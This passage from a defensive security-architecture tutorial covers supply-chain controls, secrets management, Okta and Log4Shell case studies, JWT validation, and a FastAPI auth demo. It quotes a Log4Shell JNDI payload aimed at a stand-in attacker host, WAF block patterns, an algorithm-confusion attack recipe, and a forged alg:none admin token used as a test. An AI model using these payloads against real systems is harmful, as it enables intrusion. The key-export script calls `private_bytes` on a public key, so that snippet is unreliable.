  Why: Prevents poisoned build cache attacks

Level 4: Two-party review — All changes require review
  What: Any change to build config, source, or dependencies requires 2 approvals
  How: Branch protection rules, CODEOWNERS, mandatory review
  Why: Prevents single insider threat from modifying the build undetected
```

#### Software Bill of Materials (SBOM)

```json
// CycloneDX SBOM format (machine-readable inventory of all dependencies)
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.4",
  "version": 1,
  "metadata": {
    "timestamp": "2024-01-15T10:30:00Z",
    "component": {
      "type": "application",
      "name": "products-service",
      "version": "2.3.1",
      "purl": "pkg:docker/myorg/products-service@2.3.1"
    }
  },
  "components": [
    {
      "type": "library",
      "name": "express",
      "version": "4.18.2",
      "purl": "pkg:npm/express@4.18.2",
      "hashes": [{"alg": "SHA-256", "content": "a1b2c3..."}],
      "licenses": [{"license": {"id": "MIT"}}]
    },
    {
      "type": "library",
      "name": "log4j-core",
      "version": "2.14.1",     ← Log4Shell vulnerable version!
      "purl": "pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1",
      "vulnerabilities": [
        {"id": "CVE-2021-44228", "ratings": [{"severity": "CRITICAL", "score": 10.0}]}
      ]
    }
  ]
}
```

**Why SBOMs matter:** When Log4Shell (CVE-2021-44228) was disclosed in December 2021, companies with comprehensive SBOMs identified all services using vulnerable log4j-core in hours. Companies without SBOMs took days to weeks. The difference: SBOMs are a machine-readable inventory of every dependency. Automated scanners (Trivy, Grype, Snyk) cross-reference SBOMs against vulnerability databases.

#### Sigstore: Signing and Verifying Container Images

```bash
# Sigstore cosign: cryptographically sign container images at build time
# Keyless signing: uses short-lived certificate tied to GitHub Actions OIDC identity
# No long-lived keys to manage or rotate

# Build and push image
docker build -t gcr.io/myorg/products-service:2.3.1 .
docker push gcr.io/myorg/products-service:2.3.1

# Sign the image (in CI/CD pipeline, using GitHub Actions OIDC token)
cosign sign \
  --oidc-issuer=https://token.actions.githubusercontent.com \
  gcr.io/myorg/products-service:2.3.1

# Verification at deployment time (Kubernetes admission controller)
cosign verify \
  --certificate-identity-regexp="https://github.com/myorg/products-service" \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
  gcr.io/myorg/products-service:2.3.1

# Kubernetes admission: reject any image that fails signature verification
# Policy Admission Controller (Kyverno or OPA Gatekeeper):
# apiVersion: kyverno.io/v1
# kind: ClusterPolicy
# spec:
#   rules:
#     - name: verify-image-signature
#       match:
#         resources:
#           kinds: [Pod]
#       verifyImages:
#         - imageReferences: ["gcr.io/myorg/*"]
#           attestors:
#             - entries:
#                 - keyless:
#                     subject: "https://github.com/myorg/*/.github/workflows/*.yml@refs/heads/main"
#                     issuer: "https://token.actions.githubusercontent.com"
```

---

### 8. Secrets in Application Architecture

```python
# Anti-patterns (NEVER DO THESE):

# 1. Hardcoded in source code
DATABASE_PASSWORD = "MyProductionPassword123"  # Committed to Git → permanent breach

# 2. Environment variables (better but still wrong for sensitive secrets)
import os
db_password = os.environ["DATABASE_PASSWORD"]  
# Visible in: /proc/<pid>/environ, docker inspect, kubectl describe pod, CI logs

# 3. Config files without encryption
# config.yaml:
#   database:
#     password: plaintext-secret  # Often committed accidentally

# ──────────────────────────────────────────────────────────────

# Correct patterns:

# Pattern 1: Vault Agent Sidecar (Kubernetes)
# Vault agent writes secrets to a shared in-memory volume at /vault/secrets/
# Application reads from filesystem (ephemeral: not persisted, not in env)
with open('/vault/secrets/db_password') as f:
    db_password = f.read().strip()
# No Vault SDK needed in the application
# Vault agent handles: auth, secret fetch, renewal, rotation

# Pattern 2: AWS Secrets Manager (for AWS workloads)
import boto3

def get_secret(secret_name: str) -> dict:
    client = boto3.client('secretsmanager', region_name='us-east-1')
    # IAM role (from EC2 instance profile or EKS IRSA) authorizes this call
    response = client.get_secret_value(SecretId=secret_name)
    return json.loads(response['SecretString'])

db_creds = get_secret('prod/products-service/database')
db_password = db_creds['password']
# Cache in memory; reload on rotation events via EventBridge

# Pattern 3: Kubernetes Secrets with sealed-secrets or External Secrets Operator
# External Secrets Operator syncs from Vault/AWS Secrets Manager → k8s Secret
# apiVersion: external-secrets.io/v1beta1
# kind: ExternalSecret
# spec:
#   refreshInterval: 1h         ← Re-sync from Vault every hour (handles rotation)
#   secretStoreRef:
#     kind: ClusterSecretStore
#     name: vault-backend
#   target:
#     name: products-db-secret  ← k8s Secret name
#   data:
#     - secretKey: password
#       remoteRef:
#         key: secret/products-service/database
#         property: password

# The application reads from the Kubernetes Secret as normal env var or volume mount
# External Secrets Operator handles Vault auth and secret sync transparently
```

---

## Real-World Examples

### Okta 2023 Breach: How Contained Blast Radius Prevents Catastrophe

Okta, the identity provider trusted by thousands of companies, suffered a breach in January 2022 (discovered later) and a larger breach in October 2023. The 2023 incident involved a threat actor accessing Okta's customer support system. They used a service account to access support tickets. Those tickets contained HAR files (HTTP Archive format) uploaded by customers for debugging — and some HAR files contained session tokens.

**What the attackers did:**
1. Compromised Okta's support system service account
2. Accessed HAR files from support tickets
3. Extracted session tokens from HAR files
4. Used session tokens to impersonate customers' admin users in Okta
5. From there: potentially access all applications the compromised companies integrated with Okta

**Architectural failures:**

```
Failure 1: Session tokens in support ticket files
  HAR files capture ALL HTTP traffic including cookies and tokens.
  Okta's support tooling should have stripped tokens from HAR files on upload.
  Or: HAR file analysis should be automated without human access to raw files.

Failure 2: Long-lived session tokens
  Stolen session tokens should expire quickly (15-30 minutes for admin sessions).
  Long-lived sessions (days/weeks) allow attackers prolonged access.

Failure 3: Lack of contextual anomaly detection
  Admin account suddenly logging in from a new IP, new country, new device,
  accessing new resources at unusual hours → should trigger re-authentication.
  Instead: session token valid → full access granted, no questions asked.

Failure 4: Excessive service account permissions
  The support system service account had access to all customer support data.
  Principle of least privilege: support agent should access only the specific
  customer's data they're actively working on.

Failure 5: Delayed breach disclosure
  Okta initially minimized the scope. Full extent disclosed weeks later.
  This prevented customers from taking timely remediation action.
```

**What would have contained the blast radius:**

```
1. Token binding: bind session tokens to device fingerprint (TLS channel binding).
   Stolen token ≠ valid token on different device.

2. Short-lived admin sessions: 15-30 minute timeout for privileged operations.
   Require step-up authentication (MFA re-prompt) for sensitive admin actions.

3. Contextual authentication: re-authenticate on device/IP/location change.
   Anomaly score → step-up MFA → if failed → session revocation.

4. Least-privilege service accounts: support system service account only reads
   tickets assigned to active support cases, not all tickets, not all data.

5. HAR sanitization: automated stripping of Authorization headers, cookies,
   tokens from HAR files before they reach any support agent or storage.

6. Customer-side detection: customers should have real-time alerting for
   privileged Okta admin actions (role changes, SSO config changes, app access grants).
```

### Log4Shell (CVE-2021-44228): Defense-in-Depth in Practice

In December 2021, a critical vulnerability was discovered in log4j, the most widely used Java logging library. A single log message containing `${jndi:ldap://attacker.com/exploit}` could cause log4j to make an outbound LDAP connection and download/execute arbitrary code.

**The defense-in-depth layers that worked (for protected organizations):**

```
Layer 1: Network egress filtering (stopped many attacks)
  If the application cannot make outbound LDAP connections (port 389/636),
  the JNDI lookup fails silently → no RCE even with vulnerable log4j.
  Organizations with "default deny" egress rules were protected at this layer.

Layer 2: SBOM-based rapid triage (enabled fast remediation)
  Organizations with SBOMs identified all affected services in hours:
    grep "log4j-core" sbom.json → list of vulnerable services
  Others: weeks of manual audit across hundreds of microservices.

Layer 3: WAF rules (provided temporary protection before patches)
  AWS WAF, Cloudflare, and ModSecurity released rules within hours:
    Block requests containing: ${jndi:
    Block URL-encoded variants: %24%7Bjndi%3A
  Stopped the most common attack patterns while patching proceeded.

Layer 4: Container isolation (limited blast radius if exploited)
  Containers with: read-only root filesystem, non-root user, no privilege escalation.
  Even if RCE succeeded: attacker inside a sandboxed container, not the host.
  Network policies: container can only reach specific services (not the entire VPC).

Layer 5: Secret isolation (limited credential theft if container compromised)
  Dynamic credentials (Vault): credentials expire in 1 hour.
  Even if attacker steals a database password: expires before they can do much.
  Static passwords: attackers have them permanently after the breach.
```

---

## Failure Scenarios

### Scenario 1: JWT Algorithm Confusion Attack

**Context:** Mid-size fintech company. Their API accepts JWTs signed by their IdP using RS256 (RSA private key). The JWKS endpoint is public.

**What Happened:**

A security researcher discovered the API's JWT validation middleware accepted any algorithm the token claimed. The JWKS endpoint was at `https://auth.company.com/.well-known/jwks.json`. The public key was available.

The researcher:
1. Downloaded the public key (RS256, public key — this is designed to be public)
2. Crafted a JWT with: `{"alg": "HS256"}` in the header, arbitrary claims in payload
3. Signed the JWT with HMAC-SHA256 using the public key bytes as the secret
4. Sent the crafted JWT to the API

The API's JWT library verified HS256 signatures using... the public key (which it had fetched for RS256 verification). Since the researcher had signed with the same public key bytes, verification passed. The researcher could impersonate any user including admins.

**Root Cause:** The JWT library was called as `jwt.decode(token, public_key)` without specifying `algorithms=`. The library honored the token's claimed algorithm and verified accordingly.

**Fix:**

```python
# WRONG: library infers algorithm from token header
claims = jwt.decode(token, public_key)

# CORRECT: explicit algorithm allowlist
claims = jwt.decode(
    token,
    public_key,
    algorithms=["RS256"],  # Only RS256 accepted, period
    audience="api.example.com",
    issuer="https://auth.example.com",
)
```

---

### Scenario 2: Overly Permissive IAM Role — Privilege Escalation

**Context:** E-commerce platform on AWS. A products microservice needs to read from S3 (product images) and write to DynamoDB (product catalog).

**What Happened:**

The products-service IAM role was created with:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",           ← "Administrator access is easier to start with"
    "Resource": "*"
  }]
}
```

The products-service had a path traversal vulnerability (fixed later). An attacker exploited it to run arbitrary code inside the container. With the container's IAM role having `Action: *`, the attacker:

1. Called `iam:CreateAccessKey` → created permanent credentials for themselves
2. Called `ec2:DescribeInstances` → mapped the entire VPC
3. Called `s3:GetObject` on all buckets → downloaded customer PII data
4. Called `rds:DescribeDBInstances` → found database endpoints
5. Called `secretsmanager:GetSecretValue` → retrieved database passwords

**Fix:**

```json
// Correct: minimum permissions for products-service
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:PutObject"],
      "Resource": "arn:aws:s3:::product-images-bucket/*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "dynamodb:GetItem",
        "dynamodb:PutItem",
        "dynamodb:UpdateItem",
        "dynamodb:Query"
      ],
      "Resource": "arn:aws:dynamodb:us-east-1:123456789:table/Products"
    }
  ]
}
// If products-service is compromised: attacker can only read/write product images
// and product catalog. Cannot: read other services' data, access secrets,
// escalate privileges, or map the infrastructure.
```

---

## Performance Considerations

### JWT Validation Overhead

```
JWT validation timing breakdown:
  Base64URL decode:     <0.01ms
  JSON parse:           <0.1ms
  Signature verification:
    RS256 (2048-bit):   0.5-1.5ms    (RSA verification)
    ES256 (P-256):      0.1-0.5ms    (ECDSA: faster, smaller keys)
    HS256:              <0.05ms      (HMAC: very fast, but symmetric = secret distribution problem)
  Claims validation:    <0.01ms
  JWKS fetch (cache miss): 50-200ms  (network call to IdP — must be cached!)
  
  Total with cache HIT: 1-2ms (RS256) or 0.5-1ms (ES256)
  Total with cache MISS: 50-200ms (first request after startup or key rotation)
  
  Cache strategy: in-memory JWKS cache with 5-minute TTL
  Refresh on kid-not-found (key rotation), with rate limiting on refreshes
  (prevent DoS via unknown kid flood)

OPA policy evaluation:
  Simple RBAC policy: <1ms
  Complex ABAC with data joins: 2-10ms
  With policy caching: <0.5ms (partial evaluation for common cases)
```

### Token Size Impact

```
JWT size comparison:
  Access token (typical claims): 300-600 bytes
  With many roles/permissions in token: 2-5 KB
  
  Impact on HTTP: Every request includes Authorization: Bearer <token>
  At 5KB token, 10K RPS: 50 MB/s just in authorization header bandwidth
  
  Recommendation:
    Keep tokens < 1KB (include only: sub, email, roles[], tenant_id, exp, aud, iss)
    Don't embed full permission lists in tokens — query permissions separately
    Use opaque reference tokens for sensitive claims (token introspection)
    
  Opaque tokens: token = random string; permissions stored server-side
  Pro: small token, instant revocation, no sensitive data in token
  Con: requires token introspection call (50-100ms) or Redis lookup (1-2ms)
  Use for: admin tokens, highly sensitive operations, regulatory compliance
```

---

## Trade-offs

### Authentication Mechanism Comparison

| Mechanism | Use Case | Security | Scalability | Complexity |
|---|---|---|---|---|
| Session cookies | Traditional web apps | High (server-side state, easy revocation) | Medium (requires session store) | Low |
| JWT (access token) | APIs, microservices | Medium (cannot revoke without blocklist) | High (stateless, any service validates) | Medium |
| Opaque token | Admin access, sensitive ops | High (server-side, easy revocation) | Low (requires introspection call per request) | Medium |
| mTLS | Service-to-service | Very high (crypto identity) | High (PKI infrastructure) | High |
| API key | Developer/partner APIs | Low-Medium (static, long-lived) | High (simple validation) | Very Low |

### Authorization Architecture Comparison

| Approach | Pros | Cons | Best For |
|---|---|---|---|
| JWT claims | No DB/cache call, fast | Can't revoke, stale permissions | Simple RBAC, user roles |
| Database RBAC | Real-time, auditable | DB call per request (cache needed) | Complex permissions, multi-tenant |
| OPA sidecar | Decoupled, policy-as-code | Setup complexity, Rego learning curve | Complex policies, compliance requirements |
| Service-mesh AuthZ | Zero-code, infrastructure-level | Limited expressiveness | Service-to-service allow/deny |

---

## Production Considerations

1. **Always specify algorithms explicitly in JWT validation.** Never let the library infer the algorithm from the token header. Pass an explicit allowlist: `algorithms=["RS256"]` or `algorithms=["ES256"]`. Reject any token that claims an algorithm not in your list. This single rule prevents the most common JWT vulnerability class.

2. **Validate the `aud` and `iss` claims on every JWT.** A token issued by your IdP for Service A is not valid for Service B (unless aud includes both). Audience validation prevents confused-deputy attacks. Issuer validation prevents cross-IdP token substitution.

3. **Set short expiry on access tokens.** 15-60 minutes for most APIs. Never issue access tokens valid for days. If revocation is needed, use token introspection (opaque tokens) or a Redis-based JWT blocklist checked on each validation.

4. **Store client secrets and API keys in a secrets manager, never in source code or environment variables.** Vault, AWS Secrets Manager, GCP Secret Manager — any of these is correct. An environment variable is visible in process listings, Kubernetes pod descriptions, CI/CD logs, and docker inspect output.

5. **Use dynamic database credentials wherever possible.** Vault can generate unique, short-lived (1-hour) PostgreSQL credentials per service instance. A compromised credential expires automatically. Without dynamic credentials, a breached password is valid indefinitely until manually rotated — which never happens on the ideal schedule.

6. **Implement break-glass procedures with audit trails.** In emergencies, engineers need elevated access. Instead of permanent admin roles, implement time-limited "break-glass" roles (granted for 2 hours, logged to immutable audit trail, require manager approval) via role expiry (`expires_at` in user_roles). Permanent admin access is a standing risk; break-glass is a controllable exception.

7. **Generate SBOMs for every container image at build time.** Attach SBOM to the container registry. When a vulnerability (e.g., Log4Shell) is disclosed, query your SBOM repository: which services include the affected package? Without SBOMs, this investigation takes weeks. With them, hours.

8. **Enforce egress network policies (default deny outbound).** Zero-trust doesn't just mean internal traffic. Services should only be allowed to make outbound connections to explicitly whitelisted destinations. JNDI/SSRF attacks (like Log4Shell) often require outbound network access to exfiltrate data. A default-deny egress policy stops these attacks even if the application is vulnerable.

9. **Rotate all credentials on suspected compromise immediately, not "after investigation."** Rotation is cheap (minutes with Vault). Investigation while attackers have valid credentials is expensive. Revoke first, investigate second. Okta's delayed rotation during their 2023 incident extended attacker access.

10. **Instrument authentication and authorization events as first-class telemetry.** Log: every authentication failure, every authorization denial, every privilege escalation. Alert on: >10 consecutive auth failures from a user (credential stuffing), admin role granted at unusual times, service suddenly calling new endpoints, access from new countries or IPs. Security telemetry is as important as performance telemetry.

---

## Common Beginner Mistakes

1. **Storing secrets in `.env` files committed to Git.** The `.env` file is in `.gitignore` but gets committed accidentally (or the `.gitignore` is wrong). Git history is permanent — the secret is exposed even after deletion. Use `git-secrets` or `pre-commit` hooks to prevent secrets from being committed. Use a secrets manager for all sensitive values.

2. **Putting permissions/roles in JWTs and not invalidating them on role change.** A user's role is changed from `admin` to `viewer`. Their JWT still says `roles: ["admin"]` for the next hour. They can still perform admin operations. Fix: use short token lifetimes, or use opaque tokens with Redis-backed permission lookup, or explicitly check permissions from the database/cache on each request (not from the JWT claims).

3. **Using the same client secret for multiple environments.** Production secrets should never be used in staging, development, or CI/CD environments. If a developer machine is compromised, production credentials should not be at risk. Use separate client_ids and secrets per environment with different permissions.

4. **Not validating the `redirect_uri` exactly in OAuth2 Authorization Code flows.** A common OAuth2 vulnerability: if the server allows partial match or wildcard in redirect_uri validation, an attacker crafts a request with `redirect_uri=https://attacker.com/callback` and intercepts the authorization code. Validate redirect_uri against an exact, pre-registered allowlist — no prefix matching, no wildcards.

---

## Common Senior Engineer Mistakes

1. **Conflating authentication and authorization.** A common mistake: a valid JWT means "this user is allowed to do anything they ask." JWT authentication proves identity. It says nothing about authorization. Every action must be checked against the authorization policy independently. Being authenticated as `user-123` does not authorize reading `user-456`'s data.

2. **Implementing RBAC at the API gateway and nowhere else.** The API gateway enforces coarse-grained access (user must have `products:read` role to call `/api/products`). But the database may still return any row to any authenticated user. Row-level security — ensuring user 123 only sees their own orders, not all orders — must be enforced in the application or database layer, not just the gateway.

3. **Granting IAM/service account permissions based on "what might be needed someday."** Overly permissive IAM roles are created at service inception and never audited. AWS IAM Access Analyzer, Vault's audit log, and IAM Recommendation tools identify permissions that have never been used in 90 days. Run permission audits quarterly and remove unused permissions. The principle of least privilege is not a one-time configuration — it's an ongoing maintenance discipline.

4. **Treating JWTs as opaque tokens without understanding their validation requirements.** Many engineers copy JWT validation boilerplate from StackOverflow without understanding what each validation step does. They remove the `aud` check because "it was causing errors," or skip the algorithm check because "the library handles it." Each validation step prevents a specific attack class. Understand why each check is required before modifying it.

---

## Architecture Smells

- **HTTP Basic Authentication on internal APIs:** Base64(username:password) per request, no token expiry, no rotation, visible in any traffic capture. mTLS or JWT everywhere, even on internal services.
- **"Trust but verify" between services on internal network:** One service calling another on `http://service-name:8080` without any authentication. If any pod on the cluster is compromised, it can call any other service. Use mTLS (service mesh) for all service-to-service calls.
- **Admin endpoints with the same auth as user endpoints:** `POST /admin/delete-all-users` requiring only a valid user JWT. Admin endpoints must require explicit admin role, step-up MFA, IP allowlist (internal only), and audit logging.
- **Session tokens in URLs or GET parameters:** `https://api.example.com/export?token=eyJhbG...`. URLs appear in server logs, browser history, Referer headers, CDN logs, and analytics systems. Tokens must only travel in HTTP headers (`Authorization: Bearer ...`) or secure, HttpOnly cookies.
- **Shared service accounts across multiple services:** One Vault AppRole or AWS IAM role used by 5 different services. If any service is compromised, the attacker has the credentials for all 5. Every service must have its own identity (separate Kubernetes service account, separate IAM role, separate Vault policy).

---

## Principal Engineer Perspective

**Security architecture is threat modeling, not compliance checklist.**  
Compliance frameworks (SOC2, PCI-DSS, ISO27001) tell you what boxes to check. They do not tell you how to think about your specific threat model. Who are your adversaries? What do they want? What is their capability level? A financial services company's threat model includes nation-state actors. A local restaurant app's threat model does not. Calibrate your security architecture to your actual threats. Over-engineering security costs as much as under-engineering it — in developer time, operational complexity, and user friction.

**The blast radius of any breach is a design choice.**  
Every decision about permissions scope, credential lifetime, network segmentation, and secret distribution determines how much damage an attacker can do if they successfully compromise one component. Zero-trust, dynamic credentials, short-lived tokens, pod-level network policies, and least-privilege IAM are all blast-radius-reduction techniques. The goal is not to prevent all breaches (impossible) but to ensure any breach is contained, detected quickly, and recoverable from. Design your system to fail safely, not just to succeed securely.

**Identity is the new perimeter — and it must be treated with the same rigor as the old perimeter.**  
The shift from perimeter security to identity-based security (zero-trust) transfers the critical control point from the firewall to the identity system. This means the identity provider (Okta, Auth0, your own IdP) is now the most critical infrastructure component in your security architecture. Its availability, integrity, and correctness are prerequisites for every authenticated action in your system. Invest in IdP redundancy, monitor its availability as a P0 dependency, and design degraded-mode authentication flows for when the IdP is unavailable.

**Audit logs are your forensic capability — treat them as write-once, offsite, and non-repudiable.**  
Every authentication event, every authorization decision, every secret access, every privileged operation must be logged. These logs are your only forensic capability after a breach. They must be: written to a separate, immutable store (not the application database that may be compromised), retained long enough for forensic investigation (90 days minimum, 1 year for regulated industries), and monitored in real-time for anomalies. An attacker who can delete logs can erase their tracks. Store logs in a system the compromised application cannot write to or delete from (S3 with Object Lock, Azure Immutable Blob Storage, Splunk with write-once indexers).

---

## Architecture Review Questions

1. Explain the Authorization Code + PKCE flow step by step. What attack does PKCE prevent? Why is a `client_secret` insufficient for mobile apps (and why PKCE is necessary instead)?

2. Describe the five critical JWT validation steps. For each step, explain what specific attack it prevents if skipped.

3. A microservice needs to connect to PostgreSQL. Compare three approaches: (a) password in environment variable, (b) password in Kubernetes Secret, (c) dynamic credentials from Vault. What are the security implications of each, specifically: how does a breach of the service pod affect each approach?

4. Design the RBAC data model for a multi-tenant SaaS where: tenants can define custom roles, roles can be scoped to specific resources (not just resource types), and role grants can expire. What tables, indexes, and caching strategy would you use?

5. Explain the zero-trust network model. Why does the traditional perimeter model fail for cloud-native microservices? What are the three technical mechanisms that replace perimeter trust?

6. An attacker compromises a Kubernetes pod running your payments service. The pod's IAM role has `Action: *` on all AWS resources. Trace the attack path: what can the attacker now do? How does least-privilege IAM contain this?

7. Explain SLSA Level 1 through 4. What specific attack does each level defend against? For a startup with a 3-person engineering team, which SLSA level is the minimum viable security posture?

8. A user's admin role is revoked. They have an outstanding JWT (RS256, signed by your IdP) with `roles: ["admin"]` that expires in 45 minutes. They continue making admin API calls for the next 45 minutes successfully. What architectural change prevents this?

9. Compare OPA (Open Policy Agent) with application-embedded RBAC (permission check in middleware). What are the trade-offs in: testability, consistency across services, latency, and operational overhead?

10. Design the authentication and authorization architecture for a multi-tenant SaaS that must comply with HIPAA (healthcare data). What specific requirements does HIPAA impose on: session management, audit logging, access controls, and encryption? How does your architecture meet each requirement?

---

## Visual/Animation Specification

### Animation 1: OAuth2 Authorization Code + PKCE Flow

Interactive step-by-step flow diagram:
- Five participants: Browser, App (Client), Auth Server, API Server, Token Store
- Click "Start Login" → animation begins:
  - Step 1: App generates code_verifier (random) and code_challenge (SHA256)
  - Step 2: Browser redirected to Auth Server with code_challenge
  - Step 3: User enters credentials at Auth Server (highlighted: credentials NEVER seen by App)
  - Step 4: Auth Server redirects back with auth_code
  - Step 5: App exchanges code + code_verifier for tokens
  - Step 6: Auth Server verifies SHA256(verifier) == stored challenge
  - Step 7: Tokens returned; API calls with access_token
- "Attack simulation" button: shows what happens when attacker intercepts auth_code without PKCE (succeeds) vs with PKCE (fails — no code_verifier)
- Expandable detail panels: JWT decoded header/payload at each relevant step

### Animation 2: JWT Validation Failure Modes

Interactive JWT validator with 6 attack scenarios:
- Input: paste a JWT or use provided test cases
- Attack scenarios (buttons):
  1. "Valid token" → shows green checkmarks on all 5 validation steps
  2. "alg:none attack" → red X on Step 1 (Algorithm restriction)
  3. "RS256→HS256 confusion" → red X on Step 1 (only RS256 allowed)
  4. "Expired token" → red X on Step 3 (expiration check)
  5. "Wrong audience" → red X on Step 4 (audience validation)
  6. "Wrong issuer" → red X on Step 5 (issuer validation)
- Each attack scenario: shows the malicious JWT header/payload decoded, then the specific validation that catches it, with explanation of what damage would occur if this check were skipped

---

## Hands-On Tutorial: Implementing a Complete Authentication Flow

### Setup

```bash
# Start required services
docker-compose up -d postgres redis

# Install dependencies
pip install fastapi python-jose[cryptography] httpx redis python-dotenv uvicorn
```

### Generate RSA Key Pair

```python
#!/usr/bin/env python3
# scripts/generate_keys.py
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import base64, json

# Generate RSA key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
)

# Export private key (PEM)
private_pem = private_key.private_bytes(
    serialization.Encoding.PEM,
    serialization.PrivateFormat.PKCS8,
    serialization.NoEncryption()
)

# Export public key (PEM)
public_pem = private_key.public_key().private_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
)

print("PRIVATE KEY (store in Vault, never in source code):")
print(private_pem.decode())
print("\nPUBLIC KEY (safe to publish at /jwks.json):")
print(public_pem.decode())
```

### Minimal JWT Issuer (Identity Provider)

```python
# auth_server.py — simplified IdP for demonstration
from fastapi import FastAPI, HTTPException
from jose import jwt
from datetime import datetime, timedelta
import secrets, json

app = FastAPI()

# In production: load from Vault, not hardcoded!
PRIVATE_KEY = open("private_key.pem").read()
KEY_ID = "key-2024-01"

@app.post("/oauth/token")
async def issue_token(grant_type: str, client_id: str, client_secret: str):
    """Client Credentials flow for service-to-service auth."""
    # Verify client credentials (from Vault in production)
    valid_clients = {
        "products-service": "secret-abc123",
        "orders-service": "secret-def456",
    }
    if valid_clients.get(client_id) != client_secret:
        raise HTTPException(401, "Invalid client credentials")
    
    now = datetime.utcnow()
    claims = {
        "sub": client_id,
        "iss": "https://auth.example.com",
        "aud": "api.example.com",
        "iat": now,
        "exp": now + timedelta(hours=1),
        "jti": secrets.token_hex(16),    # Unique token ID
        "roles": ["service"],
        "client_id": client_id,
    }
    
    token = jwt.encode(
        claims,
        PRIVATE_KEY,
        algorithm="RS256",
        headers={"kid": KEY_ID},
    )
    
    return {
        "access_token": token,
        "token_type": "Bearer",
        "expires_in": 3600,
    }

@app.get("/.well-known/jwks.json")
async def jwks():
    """Public key endpoint for JWT verification."""
    # Return public key in JWKS format
    # In production: generated from actual RSA key parameters
    return {
        "keys": [{
            "kty": "RSA",
            "use": "sig",
            "alg": "RS256",
            "kid": KEY_ID,
            # n, e parameters: RSA public key components (base64url encoded)
            # Generated from the actual private key
        }]
    }
```

### API Service with JWT Validation

```python
# api_server.py
from fastapi import FastAPI, Depends, HTTPException, Security
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from jose import jwt, JWTError
import httpx, time

app = FastAPI()
security = HTTPBearer()

JWKS_URI = "http://auth-server:8001/.well-known/jwks.json"
AUDIENCE = "api.example.com"
ISSUER = "https://auth.example.com"
ALLOWED_ALGORITHMS = ["RS256"]

# JWKS cache
_jwks_cache = {}
_jwks_fetched_at = 0

async def get_public_key(kid: str) -> dict:
    global _jwks_cache, _jwks_fetched_at
    
    if kid in _jwks_cache:
        return _jwks_cache[kid]
    
    # Rate-limit JWKS refreshes
    if time.time() - _jwks_fetched_at < 300 and _jwks_cache:
        raise HTTPException(401, f"Unknown key ID: {kid}")
    
    async with httpx.AsyncClient() as client:
        resp = await client.get(JWKS_URI, timeout=5.0)
        resp.raise_for_status()
        keys = resp.json()["keys"]
    
    _jwks_cache = {k["kid"]: k for k in keys}
    _jwks_fetched_at = time.time()
    
    if kid not in _jwks_cache:
        raise HTTPException(401, f"Key ID {kid} not in JWKS")
    return _jwks_cache[kid]

async def validate_token(
    credentials: HTTPAuthorizationCredentials = Security(security)
) -> dict:
    token = credentials.credentials
    
    try:
        # Decode header WITHOUT verifying (just to get kid)
        header = jwt.get_unverified_header(token)
    except JWTError:
        raise HTTPException(401, "Malformed token")
    
    # Step 1: Algorithm restriction
    if header.get("alg") not in ALLOWED_ALGORITHMS:
        raise HTTPException(401, f"Algorithm {header.get('alg')} not allowed")
    
    # Step 2: Get public key
    public_key = await get_public_key(header.get("kid", ""))
    
    try:
        # Steps 2-5: Signature + expiry + audience + issuer
        claims = jwt.decode(
            token,
            public_key,
            algorithms=ALLOWED_ALGORITHMS,
            audience=AUDIENCE,
            issuer=ISSUER,
        )
    except JWTError as e:
        raise HTTPException(401, f"Token invalid: {e}")
    
    return claims

@app.get("/api/products")
async def list_products(claims: dict = Depends(validate_token)):
    return {
        "products": [...],
        "served_to": claims["sub"],
    }

@app.get("/api/products/{product_id}")
async def get_product(product_id: int, claims: dict = Depends(validate_token)):
    # Authorization: check claims["roles"] contains "service" or user role
    if "service" not in claims.get("roles", []):
        raise HTTPException(403, "Insufficient permissions")
    return {"id": product_id, "name": "Widget"}
```

### Testing the Full Flow

```bash
# Start both servers
uvicorn auth_server:app --port 8001 &
uvicorn api_server:app --port 8002 &

# Get a token
TOKEN=$(curl -s -X POST http://localhost:8001/oauth/token \
  -d "grant_type=client_credentials&client_id=products-service&client_secret=secret-abc123" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Token: ${TOKEN:0:50}..."

# Call API with token
curl -H "Authorization: Bearer $TOKEN" http://localhost:8002/api/products

# Test: algorithm confusion attack
# Craft a token with alg:none
EVIL_HEADER=$(echo '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
EVIL_PAYLOAD=$(echo '{"sub":"attacker","roles":["admin"],"aud":"api.example.com","iss":"https://auth.example.com","exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
EVIL_TOKEN="${EVIL_HEADER}.${EVIL_PAYLOAD}."

curl -H "Authorization: Bearer $EVIL_TOKEN" http://localhost:8002/api/products
# Expected: 401 {"detail":"Algorithm none not allowed"}
```

---

## Exercises

### Conceptual Exercises

1. **OAuth2 flow selection:** For each scenario, identify the correct OAuth2 grant type: (a) a user logging into a web app, (b) a cron job that syncs data between two services, (c) a smart TV app that needs to access user's music library, (d) a CLI tool that deploys infrastructure on behalf of a developer.

2. **JWT attack analysis:** You are reviewing a JWT library's code. It calls `jwt.decode(token, key)` without specifying `algorithms`. What are the two attack classes this enables? Write the corrected call.

3. **RBAC hierarchy design:** A multi-tenant B2B SaaS needs: tenant admins who can manage their own users, superadmins who can manage all tenants, read-only auditors who can view all activity logs, and support staff who can view (but not modify) any tenant's data. Design the roles, permissions, and hierarchy. How do you ensure a tenant admin cannot elevate to superadmin?

4. **Zero-trust vs perimeter:** A company's network has: (a) internal servers, (b) employees' laptops on corporate VPN, (c) third-party contractors with VPN access, (d) cloud services in the company's VPC. Under the perimeter model, what trust level does each have? Under zero-trust, what changes and what remains the same?

5. **Secret rotation design:** A PostgreSQL password is shared across 5 microservices. Design a rotation procedure that: (a) creates a new password, (b) updates all 5 services without downtime, (c) revokes the old password. What is the sequence? What is the risk window? How does Vault dynamic credentials eliminate this problem entirely?

### Architecture Exercises

